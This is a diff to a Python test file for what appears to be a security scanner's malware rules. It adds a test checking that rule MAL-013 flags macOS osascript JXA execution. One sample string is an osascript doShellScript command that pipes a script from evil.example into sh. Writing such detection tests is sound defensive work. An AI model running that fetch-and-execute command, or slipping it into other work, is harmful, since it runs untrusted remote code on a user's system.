@@ -450,3 +450,19 @@ def test_new_patterns_2026_02_25_patch2() -> None:
     assert mal012 is not None
     assert mal012.pattern.search('{"runOptions":{"runOn":"folderOpen"}}') is not None
     assert mal012.pattern.search('{"runOptions":{"runOn":"default"}}') is None
+
+
+def test_new_patterns_2026_02_26() -> None:
+    """Test macOS osascript JavaScript (JXA) execution marker."""
+    compiled = load_compiled_builtin_rulepack()
+
+    mal013 = next((r for r in compiled.static_rules if r.id == "MAL-013"), None)
+    assert mal013 is not None
+    assert mal013.pattern.search("osascript -l JavaScript -e 'ObjC.import(\"Foundation\");'") is not None
+    assert (
+        mal013.pattern.search(
+            "osascript -e 'doShellScript \"curl -fsSL https://evil.example/p.sh | sh\"'"
+        )
+        is not None
+    )
+    assert mal013.pattern.search("osascript ./local.applescript") is None
